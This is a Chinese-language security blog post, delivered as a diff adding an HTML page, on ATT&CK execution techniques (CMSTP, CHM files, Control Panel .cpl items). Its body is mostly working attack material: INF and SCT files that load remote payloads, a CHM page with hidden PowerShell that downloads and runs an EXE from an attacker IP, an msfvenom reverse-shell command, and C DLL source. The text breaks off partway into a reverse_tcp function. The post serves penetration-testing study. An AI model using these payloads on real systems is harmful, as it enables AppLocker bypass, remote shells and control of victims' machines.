@@ -1,0 +1,829 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+<meta name="viewport"
+      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+    <meta name="author" content="SeikoSrp">
+
+
+
+
+
+
+<title>ATT&amp;CK_Execution | a blog</title>
+
+
+
+    <link rel="icon" href="/haidao.ico">
+
+
+
+
+    <!-- stylesheets list from _config.yml -->
+    
+    <link rel="stylesheet" href="/css/style.css">
+    
+
+
+
+    <!-- scripts list from _config.yml -->
+    
+    <script src="/js/script.js"></script>
+    
+    <script src="/js/tocbot.min.js"></script>
+    
+    <script src="/js/jquery.min.js"></script>
+    
+
+
+
+    
+    
+        
+    
+
+
+
+
+    <script>
+    function searchToggle() {
+        const width = $(document.body).width()
+        if(width > 479) {
+            return;
+        }
+        const search = $('.search');
+        const searchForm = $('.form-search');
+        const menuToggle = $('.menu-toggle');
+        const title = $('.navbar-header-title');
+
+        if(!search.hasClass("mobile-search")) {
+            search.addClass("mobile-search");
+            menuToggle.addClass("open-search")
+            title.addClass("mobile-title-hidden")
+        } else {
+            search.removeClass("mobile-search");
+            menuToggle.removeClass("open-search")
+            // title.css({visibility: 'visible'})
+            title.removeClass("mobile-title-hidden")
+        } 
+    }
+
+    function search(searchInputEl, formEl, flag) {
+        const path = "/" + "search.json"; // 可以在public 下查看这个search.json
+        $(formEl).submit(function(e){
+            e.preventDefault();
+            let target = null
+            if(searchInputEl == null) {
+                const screenWidth = $(document.body).width();
+                target = screenWidth > 479 ? $('#pc-search-input') : $('#mobile-search-input');
+                console.log(target);
+            } else {
+                target = $(searchInputEl)
+            }
+
+            if(!flag && target.val() === '') {
+                return ;
+            }
+
+            $("#u-search").fadeIn(500, function() {
+                $("body > .wrapper").addClass("modal-active");
+
+                $.ajax({
+                    url: path,
+                    dataType: "json",
+                    beforeSend: function (xhr) {
+                        $input = target.val();
+                        $(".form-input").val($input);
+                        const loadingBar = $('.search-loading-bar') 
+                        loadingBar.css({
+                            width:'100%',
+                            display: 'block'
+                        });
+                    },
+                    success: function( datas ) {
+                        // console.log(datas);
+                        const $resultPanel = $(".modal-body")[0];
+                        let str = `<ul class="modal-results">`;
+                        var keywords = $(".form-input").val().trim().toLowerCase().split(/[\s\-]+/);
+                        $resultPanel.innerHTML = "";
+                        let hasResult = false
+                        let text = `<div class="no-result">找不到与关键词相关的内容....</div>`;
+
+                        if ($(".form-input").val().trim().length <= 0) {
+                            // 没有结果
+                            $resultPanel.innerHTML = text;
+                            return;
+                        }
+                        datas.forEach(function (data) {
+                            var isMatch = true;
+                            if (!data.title || data.title.trim() === '') {
+                                data.title = "Untitled";
+                            }
+                            var data_title = data.title.trim().toLowerCase();
+                            var data_content = data.content.trim().replace(/<[^>]+>/g, "").toLowerCase();
+                            var data_url = data.url;
+                            var index_title = -1;
+                            var index_content = -1;
+                            var first_occur = -1;
+                            // only match artiles with not empty contents
+                            if (data_content !== '') {
+                                keywords.forEach(function (keyword, i) {
+                                    index_title = data_title.indexOf(keyword);
+                                    index_content = data_content.indexOf(keyword);
+
+                                    if (index_title < 0 && index_content < 0) {
+                                        isMatch = false;
+                                    } else {
+                                        hasResult = true
+                                        if (index_content < 0) {
+                                            index_content = 0;
+                                        }
+                                        if (i == 0) {
+                                            first_occur = index_content;
+                                        }
+                                    }
+                                });
+                            } else {
+                                isMatch = false;
+                            }
+                            // show search results
+                            if (isMatch) {
+                                str += `<li class='result-item'><a href='${data_url}' class='result-item-detail'> <span class="title">${data_title}</span>`;
+                                var content = data.content.trim().replace(/<[^>]+>/g, "");
+                                if (first_occur >= 0) {
+                                    // cut out 200 characters
+                                    var start = first_occur - 40;
+                                    var end = first_occur + 160;
+
+                                    if (start < 0) {
+                                        start = 0;
+                                    }
+
+                                    if (start == 0) {
+                                        end = 200;
+                                    }
+
+                                    if (end > content.length) {
+                                        end = content.length;
+                                    }
+
+                                    var match_content = content.substring(start, end);
+
+                                    // highlight all keywords
+                                    keywords.forEach(function (keyword) {
+                                        var regS = new RegExp(keyword, "gi");
+                                        match_content = match_content.replace(regS, `<em class="search-keyword">${keyword}</em>`);
+                                    });
+
+                                    str += `<span class="content"> ${match_content} ...</span></a>`;
+                                }
+                                str += "</li>";
+                            }
+                        });
+                        str += "</ul>";
+                        if(hasResult) {
+                            $resultPanel.innerHTML = str;
+                        } else {
+                            $resultPanel.innerHTML = text;
+                        }
+
+                    },
+                    complete: function() {
+                        setTimeout(() => {
+                                const loadingBar = $('.search-loading-bar') 
+                                loadingBar.css({
+                                    width:'0%',
+                                    display: 'none'
+                                });
+                        }, 300)
+                    }
+                });
+            })
+
+        });
+    }
+
+    $(document).ready(function() {
+        $('.modal-close').click(function () { 
+            $("#u-search").fadeOut();
+            $("body > .wrapper").removeClass("modal-active")
+        })
+
+        $('.modal-overlay').click(function() {
+            $("#u-search").fadeOut();
+            $("body > .wrapper").removeClass("modal-active")
+        })
+        search(null, ".form-search", false)
+        search("#u-search-modal-form .form-input", ".u-search-modal-form", true)
+    })
+</script>
+
+<meta name="generator" content="Hexo 4.2.1"></head>
+<body>
+<!-- Chic/layout.ejs -->
+ <div id="u-search">
+        <div class="modal">
+            <div class="modal-header">
+                <div class="container">
+                    <form id="u-search-modal-form" class="u-search-modal-form">
+                        <button type="submit" class="form-submit-btn">
+                            <img src="/image/search.png" class="search-btn-img" />
+                        </button>
+                        <input placeholder="搜索文章。。。" class="form-input" id="modal-form-input">
+                    </form>
+                    <a class="modal-close">x</a>
+                </div>
+                <div class="search-loading">
+                    <div class="search-loading-bar"></div>
+                </div>
+            </div>
+            <div class="modal-body">
+                <!-- ul 格式如下 -->
+                <!-- <ul class="modal-results">
+                    <li class="result-item">
+                        <a class="result-item-detail">
+                            <span class="title">页面配置</span>
+                            <span class="content">
+                                content
+                            </span>
+                        </a>
+                    </li>
+                </ul> -->
+            </div>
+        </div>
+        <div class="modal-overlay"></div>
+    </div>
+    <div class="wrapper">
+        <header>
+    <nav class="navbar">
+        <div class="container">
+            <div class="navbar-header header-logo"><a href="/">SeikoSrp&#39;s Blog</a></div>
+            <div class="menu navbar-right">
+                <!-- 这里表示的是pc端搜索框 -->
+                
+                
+    <div class="search ">
+        <div class="search-btn" onClick="searchToggle()">
+            <img src="/image/search.png" class="search-btn-img" />
+        </div>
+        <form class="form-search">
+            <input class="input" placeholder="搜索文章" autocomplete="off" id="pc-search-input"/>
+        </form>
+    </div>
+
+                
+                    <a class="menu-item" href="/archives">文章</a>
+                
+                    <a class="menu-item" href="/category">分类</a>
+                
+                    <a class="menu-item" href="/about">关于</a>
+                
+                <input id="switch_default" type="checkbox" class="switch_default">
+                <label for="switch_default" class="toggleBtn"></label>
+            </div>
+        </div>
+    </nav>
+
+    
+    <nav class="navbar-mobile" id="nav-mobile">
+        <div class="container">
+            <div class="navbar-header">
+                <div>
+                    <a href="/">SeikoSrp&#39;s Blog</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
+                </div>
+                <div class="navbar-mobile-right">
+                    
+                    
+    <div class="search ">
+        <div class="search-btn" onClick="searchToggle()">
+            <img src="/image/search.png" class="search-btn-img" />
+        </div>
+        <form class="form-search">
+            <input class="input" placeholder="搜索文章" autocomplete="off" id="mobile-search-input"/>
+        </form>
+    </div>
+
+                    <div class="menu-toggle" onclick="mobileBtn()">&#9776; 目录</div>
+                </div>
+                
+            </div>
+            <div class="menu" id="mobile-menu">
+                
+                    <a class="menu-item" href="/archives">文章</a>
+                
+                    <a class="menu-item" href="/category">分类</a>
+                
+                    <a class="menu-item" href="/about">关于</a>
+                
+            </div>
+        </div>
+    </nav>
+
+</header>
+<script>
+    var mobileBtn = function f() {
+        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
+        var mobileMenu = document.getElementById("mobile-menu");
+        if(toggleMenu.classList.contains("active")){
+           toggleMenu.classList.remove("active")
+            mobileMenu.classList.remove("active")
+        }else{
+            toggleMenu.classList.add("active")
+            mobileMenu.classList.add("active")
+        }
+    }
+</script>
+        <div class="main">
+            <div class="container">
+    
+    
+        <div class="post-toc">
+    <div class="tocbot-list">
+    </div>
+    <div class="tocbot-list-menu">
+        <a class="tocbot-toc-expand" onclick="expand_toc()">全部展开</a>
+        <a onclick="go_top()">回到顶部</a>
+        <a onclick="go_bottom()">前往底部</a>
+    </div>
+</div>
+
+<script>
+    document.ready(
+        function () {
+            tocbot.init({
+                tocSelector: '.tocbot-list',
+                contentSelector: '.post-content',
+                headingSelector: 'h1, h2, h3, h4, h5',
+                collapseDepth: 1,
+                orderedList: false,
+                scrollSmooth: true,
+            })
+        }
+    )
+
+    function expand_toc() {
+        var b = document.querySelector(".tocbot-toc-expand");
+        tocbot.init({
+            tocSelector: '.tocbot-list',
+            contentSelector: '.post-content',
+            headingSelector: 'h1, h2, h3, h4, h5',
+            collapseDepth: 6,
+            orderedList: false,
+            scrollSmooth: true,
+        });
+        b.setAttribute("onclick", "collapse_toc()");
+        b.innerHTML = "全部折叠"
+    }
+
+    function collapse_toc() {
+        var b = document.querySelector(".tocbot-toc-expand");
+        tocbot.init({
+            tocSelector: '.tocbot-list',
+            contentSelector: '.post-content',
+            headingSelector: 'h1, h2, h3, h4, h5',
+            collapseDepth: 1,
+            orderedList: false,
+            scrollSmooth: true,
+        });
+        b.setAttribute("onclick", "expand_toc()");
+        b.innerHTML = "全部展开"
+    }
+
+    function go_top() {
+        window.scrollTo(0, 0);
+    }
+
+    function go_bottom() {
+        window.scrollTo(0, document.body.scrollHeight);
+    }
+
+</script>
+    
+
+    
+    <article class="post-wrap">
+        <header class="post-header">
+            <h1 class="post-title">ATT&amp;CK_Execution</h1>
+            
+                <div class="post-meta">
+                    
+                        作者: <a itemprop="author" rel="author" href="/">SeikoSrp</a>
+                    
+
+                    
+                        <span class="post-time">
+                        发布于: <a href="#">十二月 18, 2020&nbsp;&nbsp;18:47:41</a>
+                        </span>
+                    
+                    
+                        <span class="post-category">
+                    分类:
+                            
+                                <a href="/categories/ATT-CK/">ATT&CK</a>
+                            
+                        </span>
+                    
+                </div>
+            
+        </header>
+
+        <div class="post-content">
+            <h2 id="CMSTP"><a href="#CMSTP" class="headerlink" title="CMSTP"></a>CMSTP</h2><p>CMSTP是Windows的重要组成部分，主要作用是与Microsoft连接管理器配置文件安装程序关联的二进制文件。它接受INF文件，这些文件可以通过恶意命令武器化，以脚本（SCT）和DLL的形式执行任意代码。它是一个受信任的Microsoft二进制文件，位于以下两个Windows目录中。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">C:\Windows\System32\cmstp.exe</span><br><span class="line">C:\Windows\SysWOW64\cmstp.exe</span><br></pre></td></tr></table></figure>
+
+<p>微软的官方文档：</p>
+<p><a href="https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/cmstp" target="_blank" rel="noopener">https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/cmstp</a></p>
+<p>基于CMSTP的方法有很多种</p>
+<h3 id="使用CMSTP绕过AppLocker"><a href="#使用CMSTP绕过AppLocker" class="headerlink" title="使用CMSTP绕过AppLocker"></a>使用CMSTP绕过AppLocker</h3><p>首先生成一个反弹shell的dll</p>
+<p><img src="Execution.assets/1574334298579.png" alt="1574334298579"></p>
+<p>在windows上写入一个INF文件，内容为：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">[version]</span><br><span class="line">Signature&#x3D;$chicago$</span><br><span class="line">AdvancedINF&#x3D;2.5</span><br><span class="line"></span><br><span class="line">[DefaultInstall_SingleUser]</span><br><span class="line">RegisterOCXs&#x3D;RegisterOCXSection</span><br><span class="line"></span><br><span class="line">[RegisterOCXSection]</span><br><span class="line">C:\test.dll</span><br><span class="line"></span><br><span class="line">[Strings]</span><br><span class="line">AppAct &#x3D; &quot;SOFTWARE\Microsoft\Connection Manager&quot;</span><br><span class="line">ServiceName&#x3D;&quot;test&quot;</span><br><span class="line">ShortSvcName&#x3D;&quot;test&quot;</span><br></pre></td></tr></table></figure>
+
+<p>其中RegisterOCXSection的内容为dll的路径（使用UnRegisterOCXSection可以支持远程文件）</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[DefaultInstall_SingleUser]</span><br><span class="line">UnRegisterOCXs&#x3D;UnRegisterOCXSection</span><br><span class="line"> </span><br><span class="line">[UnRegisterOCXSection]</span><br><span class="line">%11%\scrobj.dll,NI,http:&#x2F;&#x2F;10.0.0.2&#x2F;tmp&#x2F;powersct.sct</span><br></pre></td></tr></table></figure>
+
+<p>然后再MSF上开启监听</p>
+<p><img src="Execution.assets/1574334365207.png" alt="1574334365207"></p>
+<p>通过cmstp.exe执行INF</p>
+<p><img src="Execution.assets/1574334376470.png" alt="1574334376470"></p>
+<p>此时dll内容成功被执行，反弹shell至MSF</p>
+<p><img src="Execution.assets/1574334388885.png" alt="1574334388885"></p>
+<p>作者还提到了一种方法是执行SCT文件，首先通过INF文件使用HTTP远程加载SCT文件，使用的还是WScript</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?XML version&#x3D;&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;scriptlet&gt;</span><br><span class="line">&lt;registration </span><br><span class="line">    progid&#x3D;&quot;Pentest&quot;</span><br><span class="line">    classid&#x3D;&quot;&#123;F0001111-0000-0000-0000-0000FEEDACDC&#125;&quot; &gt;</span><br><span class="line">	&lt;!-- Proof Of Concept - @netbiosX --&gt;</span><br><span class="line">	&lt;script language&#x3D;&quot;JScript&quot;&gt;</span><br><span class="line">		&lt;![CDATA[</span><br><span class="line">			var r &#x3D; new ActiveXObject(&quot;WScript.Shell&quot;).Run(&quot;cmd &#x2F;k cd c:\ &amp; testcmstp.exe&quot;);</span><br><span class="line">		]]&gt;</span><br><span class="line">&lt;&#x2F;script&gt;</span><br><span class="line">&lt;&#x2F;registration&gt;</span><br><span class="line">&lt;&#x2F;scriptlet&gt;</span><br></pre></td></tr></table></figure>
+
+<p>注：这里是直接执行的EXE文件，还有一种方法可以在本机Powershell被禁用的情况下用作执行powershell代码的替代方案：<a href="https://gist.github.com/NickTyrer/0604bb9d7bcfef9e0cf82c28a7b76f0f/" target="_blank" rel="noopener">https://gist.github.com/NickTyrer/0604bb9d7bcfef9e0cf82c28a7b76f0f/</a></p>
+<p>然后使用HTTP服务挂起来，MSF生成一个反弹shell的EXE</p>
+<p><img src="Execution.assets/1574338928548.png" alt="1574338928548"></p>
+<p>然后使用INF文件调用SCT执行EXE文件。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmstp.exe &#x2F;s testhttp.INF</span><br></pre></td></tr></table></figure>
+
+<p>执行之后成功执行testcmstp.exe文件反弹shell</p>
+<p><img src="Execution.assets/1574339122693.png" alt="1574339122693"></p>
+<p>但是这是绕过APPLocker的方法，实际上这两个DLL和EXE文件还是需要免杀才能在真正的环境下绕过防护软件，此前Micropoor在GitHub上更新过的。</p>
+<p>原文链接：<a href="https://pentestlab.blog/2018/05/10/applocker-bypass-cmstp/" target="_blank" rel="noopener">https://pentestlab.blog/2018/05/10/applocker-bypass-cmstp/</a></p>
+<h2 id="Command-Line-Interface"><a href="#Command-Line-Interface" class="headerlink" title="Command-Line Interface"></a>Command-Line Interface</h2><p>就是cmd…好像没啥说的？</p>
+<h2 id="Compiled-HTML-File-T1223"><a href="#Compiled-HTML-File-T1223" class="headerlink" title="Compiled HTML File-T1223"></a>Compiled HTML File-T1223</h2><p>CHM文件英语“Compiled Help Manual”的简写，即“已编译的帮助文件”。CHM是微软新一代的帮助文件格式，利用HTML作源文，把帮助内容以类似数据库的形式编译储存。</p>
+<p>CHM文档实际是HTML文档经过编译之后的文件格式。我们可以通过CHM文件来触发后门。</p>
+<h3 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h3><p>首先生成一个HTML文件，内容为：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span><span class="tag">&lt;<span class="name">html</span>&gt;</span><span class="tag">&lt;<span class="name">head</span>&gt;</span><span class="tag">&lt;<span class="name">title</span>&gt;</span>Mousejack replay<span class="tag">&lt;/<span class="name">title</span>&gt;</span><span class="tag">&lt;<span class="name">head</span>&gt;</span><span class="tag">&lt;/<span class="name">head</span>&gt;</span><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">command exec</span><br><span class="line"><span class="tag">&lt;<span class="name">OBJECT</span> <span class="attr">id</span>=<span class="string">x</span> <span class="attr">classid</span>=<span class="string">"clsid:adb880a6-d8ff-11cf-9377-00aa003b7a11"</span> <span class="attr">width</span>=<span class="string">1</span> <span class="attr">height</span>=<span class="string">1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">PARAM</span> <span class="attr">name</span>=<span class="string">"Command"</span> <span class="attr">value</span>=<span class="string">"ShortCut"</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">PARAM</span> <span class="attr">name</span>=<span class="string">"Button"</span> <span class="attr">value</span>=<span class="string">"Bitmap::shortcut"</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">PARAM</span> <span class="attr">name</span>=<span class="string">"Item1"</span> <span class="attr">value</span>=<span class="string">',calc.exe'</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">PARAM</span> <span class="attr">name</span>=<span class="string">"Item2"</span> <span class="attr">value</span>=<span class="string">"273,1,1"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">OBJECT</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">SCRIPT</span>&gt;</span></span><br><span class="line">x.Click();</span><br><span class="line"><span class="tag">&lt;/<span class="name">SCRIPT</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>使用EasyCHM生成CHM格式文件</p>
+<p><img src="Execution.assets/1574410050235.png" alt="1574410050235"></p>
+<p><img src="Execution.assets/1574410056381.png" alt="1574410056381"></p>
+<p>打开TestCHMCalc.CHM可以看到弹出了计算器，也就是说已经执行了calc.exe命令。</p>
+<p><img src="Execution.assets/1574410410144.png" alt="1574410410144"></p>
+<h3 id="MSF-shell"><a href="#MSF-shell" class="headerlink" title="MSF shell"></a>MSF shell</h3><p>使用MSF生成EXE文件(实际上用powershell的base64反弹shell语句应该也是可以的，没测)</p>
+<p><img src="Execution.assets/1574410646015.png" alt="1574410646015"></p>
+<p>使用HTTP服务和Powershell远程加载和下载EXE文件，将反弹语句插入CHM</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell -WindowStyle hidden -nologo -noprofile -ep bypass IEX(New-Object Net.WebClient).DownloadFile(&#39;http:&#x2F;&#x2F;&lt;ip address&gt;&#x2F;testchmshell.exe&#39;,&#39;..\\testchmshell.exe&#39;);&amp;cmd&#x2F;c ..\\testchmshell.exe</span><br></pre></td></tr></table></figure>
+
+<p>最终的chm内容为（可以适当加一些迷惑性数据）</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">HTML</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">TITLE</span>&gt;</span>Check for Windows updates from Command Line<span class="tag">&lt;/<span class="name">TITLE</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">HEAD</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">HEAD</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">BODY</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">OBJECT</span> <span class="attr">id</span>=<span class="string">x</span> <span class="attr">classid</span>=<span class="string">"clsid:adb880a6-d8ff-11cf-9377-00aa003b7a11"</span> <span class="attr">width</span>=<span class="string">1</span> <span class="attr">height</span>=<span class="string">1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">PARAM</span> <span class="attr">name</span>=<span class="string">"Command"</span> <span class="attr">value</span>=<span class="string">"ShortCut"</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">PARAM</span> <span class="attr">name</span>=<span class="string">"Button"</span> <span class="attr">value</span>=<span class="string">"Bitmap::shortcut"</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">PARAM</span> <span class="attr">name</span>=<span class="string">"Item1"</span> <span class="attr">value</span>=<span class="string">",cmd.exe,/c C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -WindowStyle hidden -nologo -noprofile -ep bypass IEX(New-Object Net.WebClient).DownloadFile('http://&lt;ipaddress&gt; /testchmshell.exe','..\\testchmshell.exe');&amp;cmd/c ..\\testchmshell.exe"</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">PARAM</span> <span class="attr">name</span>=<span class="string">"Item2"</span> <span class="attr">value</span>=<span class="string">"273,1,1"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">OBJECT</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">SCRIPT</span>&gt;</span></span><br><span class="line">x.Click();</span><br><span class="line"><span class="tag">&lt;/<span class="name">SCRIPT</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">BODY</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">HTML</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>然后使用EasyCHM编译成CHM文件</p>
+<p><img src="Execution.assets/1574414921165.png" alt="1574414921165"></p>
+<p>在目标主机点击即可反弹shell</p>
+<p><img src="Execution.assets/1574414943536.png" alt="1574414943536"></p>
+<p>但是这个调用的是CMD，执行的时候会出现CMD的黑色框，后来从网上看的改进版的使用的是rundll32.exe可以避免黑框。无论是cmd还是Rundll32都是调用的Powershell，如果Powershell被禁或者被杀可以尝试WSC，通过wscript运行文件反弹shell，这里不再演示。</p>
+<h2 id="Control-Panel-Items-T1196"><a href="#Control-Panel-Items-T1196" class="headerlink" title="Control Panel Items-T1196"></a>Control Panel Items-T1196</h2><p>Control Panel Items是控制面板项目，是格式为.cpl的文件。在系统安装目录的system32下面有一系列.cpl文件,它们分别对应着控制面板中的项目</p>
+<p>CPL文件是Windows可执行性文件（本质是一个dll文件），但不属于可以直接独立运行的文件，通常由shell32.dll打开。</p>
+<p>同时也可以通过VBS脚本或者是js来调用。</p>
+<p>生成cpl文件的方法和dll文件相同，只需要将生成的dll后缀名改成cpl即可。</p>
+<p><strong>执行代码：</strong></p>
+<p>例：使用VC++新建一个dll项目生成一个dll.</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">#!c</span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"stdafx.h"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"Windows.h"</span></span></span><br><span class="line"><span class="function">BOOL APIENTRY <span class="title">DllMain</span><span class="params">( HANDLE hModule, </span></span></span><br><span class="line"><span class="function"><span class="params">                       DWORD  ul_reason_for_call, </span></span></span><br><span class="line"><span class="function"><span class="params">                       LPVOID lpReserved</span></span></span><br><span class="line"><span class="function"><span class="params">                     )</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">switch</span> (ul_reason_for_call)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">case</span> DLL_PROCESS_ATTACH:</span><br><span class="line">            WinExec(<span class="string">"calc.exe"</span>, SW_SHOW);</span><br><span class="line">        <span class="keyword">case</span> DLL_THREAD_ATTACH:</span><br><span class="line">        <span class="keyword">case</span> DLL_THREAD_DETACH:</span><br><span class="line">        <span class="keyword">case</span> DLL_PROCESS_DETACH:</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>比如这个例子中将代码build之后生成了cpldll.dll</p>
+<p><img src="Execution.assets/1574415023128.png" alt="1574415023128"></p>
+<p>改名成为cpldll.cpl之后双击执行了calc.exe(这里是在xp环境下，其他应该没啥区别)</p>
+<p><img src="Execution.assets/1574415038409.png" alt="1574415038409"></p>
+<p><strong>反弹shell：</strong></p>
+<p>使用MSF生成cpl文件:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows&#x2F;meterpreter&#x2F;reverse_tcp -b &#39;\x00\xff&#39; lhost&#x3D;192.168.144.176 lport&#x3D;4444 -f dll -o testcpl.cpl</span><br></pre></td></tr></table></figure>
+
+<p><img src="Execution.assets/1574415051298.png" alt="1574415051298"></p>
+<p>然后转移到目标机器直接双击就会反弹shell回来</p>
+<p><img src="Execution.assets/1574415088460.png" alt="1574415088460"></p>
+<p><img src="Execution.assets/1574415092444.png" alt="1574415092444"></p>
+<p>网上看到的文章中说msfvenom生成的文件可能存在程序兼容问题（本人没出现问题），所以提供了一个可以自己编译的代码，这里也贴一下。</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line">#!c</span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"Windows.h"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;WinSock2.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;  </span></span></span><br><span class="line"> </span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> comment(lib,<span class="meta-string">"WS2_32.lib"</span>)   </span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">reverse_tcp</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    